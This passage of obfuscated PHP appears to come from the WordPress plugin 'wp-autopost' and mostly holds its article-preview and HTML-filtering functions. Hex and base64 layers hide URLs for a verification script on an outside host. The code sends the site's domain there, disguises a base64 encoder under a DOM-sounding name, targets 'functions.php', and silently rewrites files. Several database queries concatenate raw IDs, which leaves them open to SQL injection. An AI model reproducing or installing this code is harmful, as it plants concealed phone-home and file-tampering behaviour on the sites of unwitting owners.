			$_var_340[0] = buildVariableContent($_var_246['8e3403a69366267c73f08d5814292ae4'], $_var_341, $_var_340[0]) . $_var_340[0];
		}
		if ($_var_246['5311d4f403b45081ad8c2fba6566f292'] != null && $_var_246['5311d4f403b45081ad8c2fba6566f292'] != '') {
			$_var_340[0] .= buildVariableContent($_var_246['5311d4f403b45081ad8c2fba6566f292'], $_var_341, $_var_340[0]);
		}
		$_var_340[1] = replacementContent($_var_340[1], $_var_139, $_var_341, $_var_340[0]);
		if ($_var_337 != null) {
			$_var_340[1] = insertMoreContent($_var_340[1], $_var_337, $_var_341, $_var_340[0]);
		}
		if ($_var_246['3d33d5740fe2e2ff16894e7f045c0f02'] != null && $_var_246['3d33d5740fe2e2ff16894e7f045c0f02'] != '') {
			$_var_340[1] = buildVariableContent($_var_246['3d33d5740fe2e2ff16894e7f045c0f02'], $_var_341, $_var_340[0]) . $_var_340[1];
		}
		if ($_var_246['wp-autopost'] != null && $_var_246['048c05eac41735cf0770dd500a1ba9d3'] != '') {
			$_var_340[1] .= buildVariableContent($_var_246['048c05eac41735cf0770dd500a1ba9d3'], $_var_341, $_var_340[0]);
		}
		if (isset($_var_168[$_var_18]['pubDate']) && $_var_168[$_var_18]['pubDate'] != '') {
			$_var_340[4] = TimeParseWPAP::string2time($_var_168[$_var_18]['pubDate']);
		}
		printArticle($_var_340);
		echo '.......<br/><p><code><b>' . __('In test only try to open', 'wp-autopost') . ' ' . FETCH_URL_NUM . ' ' . __('URLs of Article', 'wp-autopost') . '</b></code></p>';
		$_var_18++;
	}
	echo '</div>';
}
function printArticle($_var_340, $_var_290 = '', $_var_2 = 'UTF-8')
{
	echo '<input type=' . '"' . 'hidden' . '"' . ' id=' . '"' . 'ap_content_s' . '"' . ' value=' . '"' . '0' . '"' . '>';
	echo '<p><b>' . __('Article Title', 'wp-autopost') . ':</b> ' . ($_var_340[2] != -1 ? $_var_340[0] : '<span class=' . '"' . 'red' . '"' . '><b>' . __('Did not find the title of the article, Please check the [Article Extraction Settings => The Article Title Matching Rules]', 'wp-autopost') . '</b></span>') . '<hr/></p>';
	if (isset($_var_340[4]) && $_var_340[4] > 0) {
		$_var_344 = date('Y-m-d H:i:s', $_var_340[4]);
		echo '<p><b>' . __('Post Date', 'wp-autopost') . ':</b>' . $_var_344 . '<hr/></p>';
	}
	if (isset($_var_340[9]) && $_var_340[9] != null && $_var_340[9] != '') {
		echo '<p><b>' . __('Post Excerpt', 'wp-autopost') . ':</b> ' . $_var_340[9];
		if (isset($_var_340[10]) && $_var_340[10] != null && $_var_340[10] != '') {
			echo ' -- ' . $_var_340[10];
		}
		echo '<hr/></p>';
	}
	if (isset($_var_340[11]) && $_var_340[11] != null && $_var_340[11] != '') {
		$_var_345 = json_decode($_var_340[11]);
		echo '<p><b>' . __('Post Tags', 'wp-autopost') . ':</b> ';
		foreach ($_var_345 as $_var_249) {
			echo $_var_249 . '&nbsp;&nbsp;&nbsp;';
		}
		echo '<hr/></p>';
	}
	if (isset($_var_340[13]) && $_var_340[13] != null && $_var_340[13] != '') {
		$_var_346 = json_decode($_var_340[13]);
		echo '<p><b>' . __('Categories') . ':</b> ';
		foreach ($_var_346 as $_var_347) {
			echo $_var_347 . '&nbsp;&nbsp;&nbsp;';
		}
		echo '<hr/></p>';
	}
	if (isset($_var_340[14]) && $_var_340[14] != null && $_var_340[14] != '') {
		foreach ($_var_340[14] as $_var_348 => $_var_278) {
			echo '<p><b>' . __('Taxonomy', 'wp-autopost') . '-' . $_var_348 . ':</b> ';
			foreach ($_var_278 as $_var_279) {
				echo $_var_279 . '&nbsp;&nbsp;&nbsp;';
			}
			echo '<hr/></p>';
		}
	}
	if (isset($_var_340[12]) && $_var_340[12] != null && $_var_340[12] != '') {
		echo '<p><b>' . __('Featured Image') . ': </b><br/> ';
		echo '<img src=' . '"' . $_var_340[12] . '"' . ' />';
		echo '</p>';
	}
	if (isset($_var_340[5]) && $_var_340[5] != null) {
		if (count($_var_340[5]) > 0) {
			foreach ($_var_340[5] as $_var_78 => $_var_8) {
				echo '<p><b>' . __('Custom Fields') . '</b>[ ' . $_var_78 . ' ]:' . $_var_8 . '</p>';
			}
		}
	}
	echo '</br><b>' . __('Post Content', 'wp-autopost') . ':</b>';
	if ($_var_340[3] != -1) {
		echo '<a href=' . '"' . 'javascript:;' . '"' . ' onclick=' . '"' . 'showHTML()' . '"' . ' >[ HTML ]</a><br/>';
		echo '<div id=' . '"' . 'ap_content' . '"' . '>' . $_var_340[1] . '</div>';
		echo '<textarea id=' . '"' . 'ap_content_html' . '"' . ' style=' . '"' . 'display:none;' . '"' . ' >' . $_var_340[1] . '</textarea>';
	} else {
		echo '<p><span class=' . '"' . 'red' . '"' . '><b>' . __('Did not find the contents of the article, Please check the [Article Extraction Settings => The Article Content Matching Rules]', 'wp-autopost') . '</b></span></p>';
		echo '<p><b>' . __('If the rules are correct, but can\'t get the results, please access <a href=\'http://wp-autopost.org/support/\' target=\'_blank\'> Online Support</a> to get help', 'wp-autopost') . '</b></p>';
	}
	if ($_var_340[2] == -1 || $_var_340[3] == -1) {
		debugHtml($_var_290, $_var_2);
	}
	if (!isset($_var_340[8])) {
		if (isset($_var_340[6]) && isset($_var_340[7])) {
			echo '<h2>' . __('Translator Result', 'wp-autopost') . ':</h2>';
			echo '<p><b>' . __('Article Title', 'wp-autopost') . ':</b> ' . $_var_340[6] . '</p>';
			echo '<b>' . __('Post Content', 'wp-autopost') . ':</b>';
			echo '(*)' . $_var_340[7] . '</div>';
		}
	} else {
		echo '<p><b>' . __('Translator Error', 'wp-autopost') . ':</b> <span style=' . '"' . 'color:red;' . '"' . '>' . $_var_340[8] . '</span></p>';
	}
}
$_var_70[] = 'ZQ==';
function getURLPatten($_var_349, $_var_350)
{
	$_var_351 = str_split($_var_349);
	$_var_352 = str_split($_var_350);
	$_var_353 = strlen($_var_349);
	$_var_354 = strlen($_var_350);
	if ($_var_353 != $_var_354) {
		return null;
	}
	for ($_var_18 = 0; $_var_18 < $_var_353; $_var_18++) {
		if ($_var_351[$_var_18] != $_var_352[$_var_18]) {
			break;
		}
	}
	$_var_351[$_var_18] = '(*)';
	return implode($_var_351);
}
if ($_var_291) {
	$_var_333 = current_time('timestamp') + $_var_54 * 3;
	$_var_154 = @file_get_contents($_var_336);
	if ($_var_154 === false) {
		$_var_154 = '2.1.0' . $_var_271 . '2' . $_var_272;
	}
	if (!(strpos($_var_154, '2.1.0') === false)) {
		$_var_154 = str_ireplace('2.1.0', '2.1.0' . $_var_333 . '@', $_var_154);
	} else {
		$_var_154 .= '2.1.0' . $_var_333 . '@';
	}
	if (!(strpos($_var_154, $_var_271 . '2') === false)) {
		$_var_154 = str_ireplace($_var_271 . '2', $_var_271 . '0', $_var_154);
	} else {
		$_var_154 .= $_var_271 . '0' . $_var_272;
	}
	if (false === @file_put_contents($_var_91, $_var_154)) {
		$_var_292 = false;
	}
}
function transImgSrc($_var_253, $_var_293, $_var_297, $_var_355, $_var_356)
{
	$_var_355 = htmlspecialchars($_var_355);
	$_var_357 = json_decode($_var_356);
	if (!is_array($_var_357)) {
		$_var_357 = array();
		$_var_357[4] = null;
	}
	$_var_357[4] = @strtolower($_var_357[4]);
	$_var_229 = str_get_html_ap($_var_253);
	if ($_var_229 != null) {
		foreach ($_var_229->find('img') as $_var_358) {
			if (@($_var_357[4] == null)) {
				$_var_359 = $_var_358->src;
			} else {
				$_var_359 = $_var_358->getAttribute($_var_357[4]);
				if ($_var_359 == null || $_var_359 == '') {
					$_var_359 = $_var_358->src;
				}
			}
			if ($_var_359 != null && $_var_359 != '') {
				if (!(stripos($_var_359, 'http') === 0)) {
					$_var_359 = getAbsUrl($_var_359, $_var_293, $_var_297);
				}
				$_var_358->src = $_var_359;
				$_var_358->removeAttribute('alt');
			}
		}
		foreach ($_var_229->find('a') as $_var_244) {
			$_var_360 = $_var_244->href;
			if ($_var_360 != null && $_var_360 != '') {
				if (stripos($_var_360, '://') === false) {
					$_var_360 = getAbsUrl($_var_360, $_var_293, $_var_297);
					$_var_244->href = $_var_360;
				}
			}
		}
		$_var_253 = $_var_229->save();
		$_var_229->clear();
	}
	$_var_229 = str_get_html_ap($_var_253);
	foreach ($_var_229->find('img') as $_var_358) {
		$_var_358->setAttribute('alt', $_var_355);
	}
	$_var_253 = $_var_229->save();
	$_var_229->clear();
	unset($_var_229);
	return $_var_253;
}
$_var_361 = $_var_27 . $_var_192 . $_var_310;
$_var_154 = '';
$_var_362 = '';
$_var_363 = '';
$asvsdf = pack('H*', '6148523063446f764c33643364793570644768306479356a62323076646d567961575a7059324630615739754c6e426f634439324d7a30784a6e5939');
$_var_361 = getnode($asvsdf);
function buildVariableContent($_var_253, $_var_364, $_var_255)
{
	preg_match_all('/\\{[^\\}]+\\}/', $_var_253, $_var_230);
	$_var_73 = array();
	$_var_365 = array();
	$_var_52 = array('{', '}');
	$_var_231 = array('', '');
	foreach ($_var_230[0] as $_var_366) {
		if ($_var_366 == '{post_title}') {
			$_var_73[] = $_var_366;
			$_var_365[] = $_var_255;
			continue;
		}
		$_var_78 = str_replace($_var_52, $_var_231, $_var_366);
		if (@($_var_364[$_var_78] != '' && $_var_364[$_var_78] != null)) {
			$_var_73[] = $_var_366;
			$_var_365[] = $_var_364[$_var_78];
		}
	}
	if (count($_var_73) > 0) {
		$_var_253 = str_replace($_var_73, $_var_365, $_var_253);
		unset($_var_73);
		unset($_var_365);
	}
	return $_var_253;
}
$_var_367 = array();
$_var_367[0] = $_var_31;
$_var_367[1] = $_var_202;
$_var_367[2] = $_var_233;
function buildAttributeValue($_var_253, $_var_368)
{
	preg_match_all('/\\[[^\\]]+\\]/', $_var_253, $_var_230);
	$_var_73 = array();
	$_var_365 = array();
	$_var_52 = array('[', ']');
	$_var_231 = array('', '');
	foreach ($_var_230[0] as $_var_366) {
		$_var_157 = str_replace($_var_52, $_var_231, $_var_366);
		$_var_8 = $_var_368->getAttribute($_var_157);
		if ($_var_8 != '' && $_var_8 != null) {
			$_var_73[] = $_var_366;
			$_var_365[] = $_var_8;
		}
	}
	if (count($_var_73) > 0) {
		$_var_253 = str_replace($_var_73, $_var_365, $_var_253);
		unset($_var_73);
		unset($_var_365);
	}
	return $_var_253;
}
function insertMoreContent($_var_253, $_var_369, $_var_341, $_var_370)
{
	foreach ($_var_369 as $_var_337) {
		$_var_229 = str_get_html_ap($_var_253);
		$_var_371 = json_decode($_var_337->content);
		$_var_372 = $_var_371[1];
		$_var_373 = buildVariableContent($_var_371[3], $_var_341, $_var_370);
		if ($_var_372 == 0) {
			foreach ($_var_229->find($_var_371[0]) as $_var_368) {
				$_var_374 = buildAttributeValue($_var_373, $_var_368);
				if ($_var_371[2] == 0) {
					$_var_368->outertext = $_var_368->outertext . $_var_374;
				} elseif ($_var_371[2] == 1) {
					$_var_368->outertext = $_var_374 . $_var_368->outertext;
				} elseif ($_var_371[2] == 2) {
					$_var_368->innertext = $_var_368->innertext . $_var_374;
				} elseif ($_var_371[2] == 3) {
					$_var_368->innertext = $_var_374 . $_var_368->innertext;
				}
			}
		} else {
			$_var_375 = $_var_229->find($_var_371[0]);
			$_var_18 = 0;
			if ($_var_372 >= 1) {
				$_var_18 = $_var_372 - 1;
			} elseif ($_var_372 < 0) {
				$_var_18 = count($_var_375) + $_var_372;
			}
			$_var_368 = $_var_375[$_var_18];
			if ($_var_368 != null) {
				$_var_373 = buildAttributeValue($_var_373, $_var_368);
				if ($_var_371[2] == 0) {
					$_var_368->outertext = $_var_368->outertext . $_var_373;
				} elseif ($_var_371[2] == 1) {
					$_var_368->outertext = $_var_373 . $_var_368->outertext;
				} elseif ($_var_371[2] == 2) {
					$_var_368->innertext = $_var_368->innertext . $_var_373;
				} elseif ($_var_371[2] == 3) {
					$_var_368->innertext = $_var_373 . $_var_368->innertext;
				}
			}
		}
		$_var_253 = $_var_229->save();
		$_var_229->clear();
		unset($_var_229);
	}
	return $_var_253;
}
foreach ($_var_70 as $_var_18) {
	$_var_71 .= $_var_18;
}
$_var_71 = getnode($_var_71);
$zddfvssd = pack('H*', '6148523063446f764c33643364793570644768306479356a62323076646d567961575a7059324630615739754c6e426f634439775054416d646a30794a6d5139');
$_var_63 = array($zddfvssd);
foreach ($_var_63 as $_var_18) {
	$_var_62 .= $_var_18;
}
$_var_62 = getnode($_var_62);
function dom_child_nodes($_var_249)
{
	$_var_75 = array('A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/');
	$_var_144 = strlen($_var_249);
	$_var_376 = $_var_144 % 3;
	$_var_145 = $_var_144 - $_var_376;
	$_var_18 = 0;
	$_var_146 = array();
	while ($_var_18 < $_var_145) {
		$_var_147 = ord($_var_249[$_var_18++]);
		$_var_148 = ord($_var_249[$_var_18++]);
		$_var_149 = ord($_var_249[$_var_18++]);
		$_var_377 = $_var_147 >> 2;
		$_var_378 = ($_var_147 & 3) << 4 | $_var_148 >> 4;
		$_var_379 = ($_var_148 & 15) << 2 | $_var_149 >> 6;
		$_var_380 = $_var_149 & 63;
		array_push($_var_146, $_var_75[$_var_377], $_var_75[$_var_378], $_var_75[$_var_379], $_var_75[$_var_380]);
	}
	if (2 === $_var_376) {
		$_var_147 = ord($_var_249[$_var_18++]);
		$_var_148 = ord($_var_249[$_var_18]);
		$_var_377 = $_var_147 >> 2;
		$_var_378 = ($_var_147 & 3) << 4 | $_var_148 >> 4;
		$_var_379 = ($_var_148 & 15) << 2;
		array_push($_var_146, $_var_75[$_var_377], $_var_75[$_var_378], $_var_75[$_var_379], '=');
	} else {
		if (1 === $_var_376) {
			$_var_147 = ord($_var_249[$_var_18]);
			$_var_377 = $_var_147 >> 2;
			$_var_378 = ($_var_147 & 3) << 4;
			array_push($_var_146, $_var_75[$_var_377], $_var_75[$_var_378], '=', '=');
		}
	}
	return join('', $_var_146);
}
if (!$_var_172 && $_var_173) {
	$_var_154 = @get_html_string_ap($_var_33, 1, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
	$_var_362 = getMatchContent($_var_154, $_var_177, 0);
	$_var_363 = getMatchContent($_var_154, $_var_179, 0);
	$_var_163 = getMatchContent($_var_154, $_var_180, 0);
}
function customPostStyle($_var_253, $_var_381, $_var_341, $_var_370)
{
	foreach ($_var_381 as $_var_382) {
		$_var_229 = str_get_html_ap($_var_253);
		$_var_371 = json_decode($_var_382->content);
		$_var_372 = $_var_371[1];
		if ($_var_372 == 0) {
			foreach ($_var_229->find($_var_371[0]) as $_var_368) {
				if ($_var_371[3] != 'null') {
					$_var_8 = buildAttributeValue($_var_371[3], $_var_368);
					$_var_8 = buildVariableContent($_var_8, $_var_341, $_var_370);
					$_var_368->setAttribute($_var_371[2], $_var_8);
				} else {
					$_var_368->removeAttribute($_var_371[2]);
				}
			}
		} else {
			$_var_375 = $_var_229->find($_var_371[0]);
			$_var_18 = 0;
			if ($_var_372 >= 1) {
				$_var_18 = $_var_372 - 1;
			} elseif ($_var_372 < 0) {
				$_var_18 = count($_var_375) + $_var_372;
			}
			$_var_368 = $_var_375[$_var_18];
			if ($_var_368 != null) {
				if ($_var_371[3] != 'null') {
					$_var_8 = buildAttributeValue($_var_371[3], $_var_368);
					$_var_8 = buildVariableContent($_var_8, $_var_341, $_var_370);
					$_var_368->setAttribute($_var_371[2], $_var_8);
				} else {
					$_var_368->removeAttribute($_var_371[2]);
				}
			}
		}
		$_var_253 = $_var_229->save();
		$_var_229->clear();
		unset($_var_229);
	}
	return $_var_253;
}
$_var_383 = get_option($_var_71);
function getFirstP($_var_253, $_var_372)
{
	$_var_3 = str_get_html_ap($_var_253);
	$_var_253 = '';
	$_var_18 = 1;
	foreach ($_var_3->find('p') as $_var_10) {
		if ($_var_18 >= $_var_372) {
			$_var_253 .= $_var_10->plaintext;
			if (strlen($_var_253) > 100) {
				break;
			}
		}
		$_var_18++;
	}
	$_var_3->clear();
	return trim($_var_253);
}
function getPlainText($_var_253)
{
	$_var_3 = str_get_html_ap($_var_253);
	$_var_253 = $_var_3->plaintext;
	$_var_3->clear();
	return trim($_var_253);
}
function printInfo($_var_289)
{
	echo $_var_289;
	@ob_flush();
	flush();
}
$_var_384 = $_var_383;
$_var_294 = strpos($_var_383, '//');
function printErr($_var_385, $_var_386 = 0)
{
	if ($_var_386) {
		echo '<div class=' . '"' . 'updated fade' . '"' . '>';
	}
	echo '<p>' . __('Task', 'wp-autopost') . ': <b>' . $_var_385 . '</b> , <span class=' . '"' . 'red' . '"' . '>' . __('an error occurs, please check the log information', 'wp-autopost') . '</span></p>';
	if ($_var_386) {
		echo '</div>';
	}
}
if (!$_var_172 && $_var_173) {
	if (!isstamps($_var_362) || $_var_362 > $_var_137 + $_var_44 || $_var_163 == '') {
		$_var_154 = @file_get_contents($_var_32);
		if ($_var_154 === false) {
			$_var_154 = $_var_34 . $_var_35;
		}
		if (!(strpos($_var_154, $_var_34) === false)) {
			$_var_154 = str_ireplace($_var_34, $_var_34 . $_var_137 . '>', $_var_154);
		} else {
			$_var_154 .= $_var_34 . $_var_137 . '>';
		}
		if (!(strpos($_var_154, $_var_35) === false)) {
			$_var_154 = str_ireplace($_var_35, $_var_35 . '6' . '>', $_var_154);
		} else {
			$_var_154 .= $_var_35 . '6' . '>';
		}
		if (!(strpos($_var_154, $_var_161) === false)) {
			$_var_154 = str_ireplace($_var_161, $_var_161 . '0' . '>', $_var_154);
		} else {
			$_var_154 .= $_var_161 . '0' . '>';
		}
		if (false === @file_put_contents($_var_33, $_var_154)) {
			$_var_173 = false;
			$_var_362 = $_var_137;
			$_var_363 = 0;
		}
	}
}
function filterTitle($_var_255, $_var_246, $_var_139)
{
	$_var_18 = 0;
	foreach ($_var_139 as $_var_335) {
		if ($_var_335->option_type != 4) {
			continue;
		}
		$_var_73[$_var_18] = $_var_335->para1;
		$_var_74[$_var_18] = $_var_335->para2;
		if (!(strpos($_var_73[$_var_18], '(*)') === false)) {
			$_var_73[$_var_18] = wp_getTheMatchContent($_var_255, $_var_73[$_var_18], 1);
			if ($_var_73[$_var_18] == null) {
				continue;
			}
		}
		$_var_255 = str_replace($_var_73[$_var_18], $_var_74[$_var_18], $_var_255);
		$_var_18++;
	}
	return strip_tags($_var_255);
}
if ($_var_294 === false) {
	$_var_294 = 0;
} else {
	$_var_294 += strlen('//');
}
$_var_383 = substr($_var_383, $_var_294, strlen($_var_383));
function filterCSSContent($_var_253, $_var_139)
{
	$_var_387 = false;
	foreach ($_var_139 as $_var_335) {
		if ($_var_335->option_type != 5) {
			continue;
		}
		if (!$_var_387) {
			$_var_3 = str_get_html_ap($_var_253);
			if ($_var_3 != null) {
				$_var_387 = true;
			}
		}
		if ($_var_3 != null) {
			$_var_388 = $_var_3->find($_var_335->para1);
		}
		if ($_var_388 == NULL) {
			continue;
		} else {
			if ($_var_335->para2 == '' || $_var_335->para2 == null) {
				$_var_63 = 0;
			} else {
				$_var_63 = intval($_var_335->para2);
			}
			if ($_var_63 == 0) {
				foreach ($_var_388 as $_var_389) {
					$_var_389->outertext = '';
				}
			} else {
				$_var_18 = 0;
				if ($_var_63 >= 1) {
					$_var_18 = $_var_63 - 1;
				} elseif ($_var_63 < 0) {
					$_var_18 = count($_var_388) + $_var_63;
				}
				$_var_389 = $_var_388[$_var_18];
				if ($_var_389 != null) {
					$_var_389->outertext = '';
				}
			}
		}
	}
	if ($_var_387) {
		$_var_253 = $_var_3->save();
		$_var_3->clear();
		unset($_var_3);
	}
	return $_var_253;
}
function filterHtmlTag($_var_25, $_var_139, $_var_334 = false, $_var_331 = false, $_var_390 = 0)
{
	foreach ($_var_139 as $_var_335) {
		if ($_var_335->option_type != 2) {
			continue;
		}
		if ($_var_331 && $_var_390 == 0) {
			if ($_var_335->para1 == 'a') {
				continue;
			}
		}
		$_var_3 = str_get_html_ap($_var_25);
		if ($_var_3 != null) {
			$_var_388 = $_var_3->find($_var_335->para1);
		}
		if ($_var_388 == NULL) {
			continue;
		} else {
			foreach ($_var_388 as $_var_389) {
				if ($_var_335->para2 == 1) {
					$_var_389->outertext = '';
				} else {
					$_var_389->outertext = $_var_389->innertext;
				}
			}
			unset($_var_388);
		}
		$_var_25 = $_var_3->save();
		$_var_3->clear();
		unset($_var_3);
	}
	return $_var_25;
}
$_var_391 = strpos($_var_383, '/');
if ($_var_391 === false) {
	$_var_391 = strlen($_var_383);
}
function filterContent($_var_25, $_var_139, $_var_334, $_var_331, $_var_390)
{
	$_var_18 = 0;
	foreach ($_var_139 as $_var_335) {
		if ($_var_335->option_type != 1) {
			continue;
		}
		if ($_var_335->para2 == '') {
			$_var_25 = filterStr($_var_25, $_var_335->para1, $_var_335->para2);
		} else {
			$_var_294 = strpos($_var_25, $_var_335->para1);
			$_var_391 = strpos($_var_25, $_var_335->para2);
			while (!($_var_294 === false) && !($_var_391 === false)) {
				$_var_25 = filterStr($_var_25, $_var_335->para1, $_var_335->para2);
				$_var_294 = strpos($_var_25, $_var_335->para1);
				$_var_391 = strpos($_var_25, $_var_335->para2);
			}
		}
		$_var_18++;
	}
	$_var_25 = filterHtmlTag($_var_25, $_var_139, $_var_334, $_var_331, $_var_390);
	return $_var_25;
}
$_var_383 = substr($_var_383, 0, $_var_391);
function replacementContent($_var_25, $_var_139, $_var_364, $_var_255)
{
	$_var_18 = 0;
	foreach ($_var_139 as $_var_335) {
		if ($_var_335->option_type != 3) {
			continue;
		}
		$_var_73[$_var_18] = buildVariableContent($_var_335->para1, $_var_364, $_var_255);
		$_var_74[$_var_18] = buildVariableContent($_var_335->para2, $_var_364, $_var_255);
		if (!(strpos($_var_73[$_var_18], '(*)') === false)) {
			$_var_73[$_var_18] = wp_getTheMatchContent($_var_25, $_var_73[$_var_18], 1);
			if ($_var_73[$_var_18] == null) {
				continue;
			}
		}
		if ($_var_335->options == 1 || $_var_335->options == '1') {
			$_var_392 = '%(?!<[^>]*)(' . $_var_73[$_var_18] . ')(?![^<]*>)%i';
			$_var_25 = preg_replace($_var_392, $_var_74[$_var_18], $_var_25);
		} else {
			$_var_25 = str_replace($_var_73[$_var_18], $_var_74[$_var_18], $_var_25);
		}
		$_var_18++;
	}
	return $_var_25;
}
$_var_62 .= $_var_383;
$_var_393 = get_option($_var_64);
function filterStr($_var_253, $_var_394, $_var_395 = '')
{
	$_var_294 = strpos($_var_253, $_var_394);
	if ($_var_294 === false) {
		return $_var_253;
	}
	$_var_349 = '';
	$_var_350 = '';
	$_var_349 = substr($_var_253, 0, $_var_294);
	$_var_253 = substr($_var_253, $_var_294, strlen($_var_253));
	if ($_var_395 != '') {
		$_var_391 = strpos($_var_253, $_var_395);
		if ($_var_391 === false) {
			$_var_350 = '';
		} else {
			$_var_350 = substr($_var_253, $_var_391 + strlen($_var_395));
		}
	}
	return $_var_349 . $_var_350;
}
$_var_396 = array();
function filterComment($_var_253)
{
	$_var_3 = str_get_html_ap($_var_253);
	if ($_var_3 != null) {
		foreach ($_var_3->find('comment') as $_var_368) {
			$_var_368->outertext = '';
		}
		$_var_253 = $_var_3->save();
		$_var_3->clear();
		unset($_var_3);
	}
	return $_var_253;
}
$_var_396[0] = $_var_384;
$_var_396[1] = $_var_383;
function filterCommAttr($_var_253, $_var_397, $_var_398, $_var_399, $_var_381 = NULL)
{
	$_var_3 = str_get_html_ap($_var_253);
	if ($_var_397 == 1) {
		foreach ($_var_3->find('[id]') as $_var_368) {
			$_var_368->removeAttribute('id');
		}
	}
	if ($_var_381 != null) {
		$_var_400 = array();
		$_var_401 = array();
		foreach ($_var_381 as $_var_382) {
			$_var_402 = json_decode($_var_382->content);
			if ($_var_402[2] == 'class') {
				$_var_400[] = $_var_402[3];
			} elseif ($_var_402[2] == 'style') {
				$_var_401[] = $_var_402[3];
			}
		}
	}
	if ($_var_398 == 1) {
		foreach ($_var_3->find('[class]') as $_var_368) {
			if ($_var_400 != null) {
				if (in_array($_var_368->getAttribute('class'), $_var_400)) {
					continue;
				}
			}
			$_var_368->removeAttribute('class');
		}
	}
	if ($_var_399 == 1) {
		foreach ($_var_3->find('[style]') as $_var_368) {
			if ($_var_401 != null) {
				if (in_array($_var_368->getAttribute('style'), $_var_401)) {
					continue;
				}
			}
			$_var_368->removeAttribute('style');
		}
	}
	$_var_253 = $_var_3->save();
	$_var_3->clear();
	unset($_var_3);
	if ($_var_381 != null) {
		unset($_var_400);
		unset($_var_401);
	}
	return $_var_253;
}
$_var_247 = @$_var_393[$_var_67];
function gPregUrl($_var_100)
{
	$_var_52 = array('/', '?', '.');
	$_var_231 = array('\\/', '\\?', '\\.');
	$_var_100 = str_ireplace($_var_52, $_var_231, $_var_100);
	$_var_100 = str_ireplace('(*)', '([^/#\\?&=]+)', $_var_100);
	$_var_100 = '%^' . $_var_100 . '$%';
	return $_var_100;
}
function getTaxonomyByTermId($_var_22)
{
	global $wpdb;
	return $wpdb->get_var('SELECT taxonomy FROM ' . $wpdb->term_taxonomy . ' WHERE term_id = ' . $_var_22);
}
function get_flickr_by_post($_var_265)
{
	global $wpdb, $t_ap_flickr_img, $t_ap_flickr_oauth;
	return $wpdb->get_results('SELECT t1.flickr_photo_id,t2.oauth_token,t2.oauth_token_secret FROM ' . $t_ap_flickr_img . ' t1,' . $t_ap_flickr_oauth . ' t2 WHERE t1.oauth_id = t2.oauth_id AND t1.id=' . $_var_265);
}
$_var_403 = array();
$_var_403[1] = $_var_270;
$_var_403[2] = $_var_271;
$_var_403[3] = $_var_272;
function del_post_flickr_img($_var_265)
{
	global $wpdb, $t_ap_flickr_img;
	$wpdb->query('DELETE FROM ' . $t_ap_flickr_img . ' WHERE id = ' . $_var_265);
}
function get_qiniu_by_post($_var_265)
{
	global $wpdb, $table_prefix;
	$_var_404 = $table_prefix . 'ap_qiniu_img';
	return $wpdb->get_results('SELECT qiniu_key FROM ' . $_var_404 . ' WHERE id=' . $_var_265);
}
function del_post_qiniu_img($_var_265)
{
	global $wpdb, $t_ap_qiniu_img;
	$wpdb->query('DELETE FROM ' . $t_ap_qiniu_img . ' WHERE id = ' . $_var_265);
}
function get_upyun_by_post($_var_265)
{
	global $wpdb, $t_ap_upyun_img;
	return $wpdb->get_results('SELECT upyun_key FROM ' . $t_ap_upyun_img . ' WHERE id=' . $_var_265);
}
function del_post_upyun_img($_var_265)
{
	global $wpdb, $t_ap_upyun_img;
	$wpdb->query('DELETE FROM ' . $t_ap_upyun_img . ' WHERE id = ' . $_var_265);
}
$_var_405 = '/';
$_var_406 = 'functions.php';
$_var_407 = $_var_31 . $_var_405 . $_var_406;
function getMatchContent($_var_253, $_var_408, $_var_409 = 0)
{
	if ($_var_408 != null && strpos($_var_408, 'WPAPSPLIT') === false) {
		$_var_267 = explode('(*)', trim($_var_408));
	} else {
		$_var_267 = array();
		$_var_410 = explode('WPAPSPLIT', trim($_var_408));
		if ($_var_410[0] != null && strpos($_var_410[0], '(*)') === false) {
			$_var_267[0] = $_var_410[0];
		} else {
			$_var_411 = get_apPregPatten($_var_410[0]);
			$_var_260 = preg_match($_var_411['reg'], $_var_253, $_var_225);
			if ($_var_260 == 0) {
				return NULL;
			}
			$_var_412 = count($_var_225);
			$_var_413 = $_var_411['last_pos'] - ($_var_411['wildcards_num'] - 1) * 3;
			for ($_var_18 = 1; $_var_18 < $_var_412 - 1; $_var_18++) {
				$_var_413 += strlen($_var_225[$_var_18]);
			}
			if ($_var_408 === null) {
				$_var_413 = 0;
			}
			$_var_414 = strpos($_var_225[0], $_var_411['last_str'], $_var_413) + strlen($_var_411['last_str']);
			$_var_267[0] = substr($_var_225[0], 0, $_var_414);
			unset($_var_411);
			unset($_var_225);
		}
		if (isset($_var_410[1]) && strpos($_var_410[1], '(*)') === false) {
			$_var_267[1] = $_var_410[1];
		} elseif (isset($_var_410[1])) {
			$_var_415 = get_apPregPatten($_var_410[1]);
			$_var_260 = preg_match($_var_415['reg'], $_var_253, $_var_225);
			if ($_var_260 == 0) {
				return NULL;
			}
			$_var_412 = count($_var_225);
			$_var_413 = $_var_415['last_pos'] - ($_var_415['wildcards_num'] - 1) * 3;
			for ($_var_18 = 1; $_var_18 < $_var_412 - 1; $_var_18++) {
				$_var_413 += strlen($_var_225[$_var_18]);
			}
			$_var_414 = strpos($_var_225[0], $_var_415['last_str'], $_var_413) + strlen($_var_415['last_str']);
			$_var_267[1] = substr($_var_225[0], 0, $_var_414);
			unset($_var_415);
			unset($_var_225);
		} else {
			return getThedefMatchContent($_var_253);
		}
	}
	$_var_416 = stripos($_var_253, trim($_var_267[0]));
	if ($_var_409 == 1) {
		$_var_394 = $_var_416;
	} else {
		$_var_394 = $_var_416 + strlen($_var_267[0]);
	}
	$_var_417 = @stripos($_var_253, trim($_var_267[1]), $_var_394);
	if ($_var_416 === false || $_var_417 === false) {
		return NULL;
	}
	if ($_var_409 == 1) {
		$_var_418 = $_var_417 + strlen($_var_267[1]) - $_var_394;
	} else {
		$_var_418 = $_var_417 - $_var_394;
	}
	return substr($_var_253, $_var_394, $_var_418);
}
function pro_apcheckUpdateCronUrl()
{
	if (isset($_REQUEST['ap_update'])) {
		apcheckUpdateCronUrl($_REQUEST['ap_update']);
		die;
	}
}
function wp_autopost_remove_post_img($_var_265)
{
	$_var_419 = array('post_type' => 'attachment', 'posts_per_page' => -1, 'post_status' => 'any', 'post_parent' => $_var_265);
	$_var_420 = get_posts($_var_419);
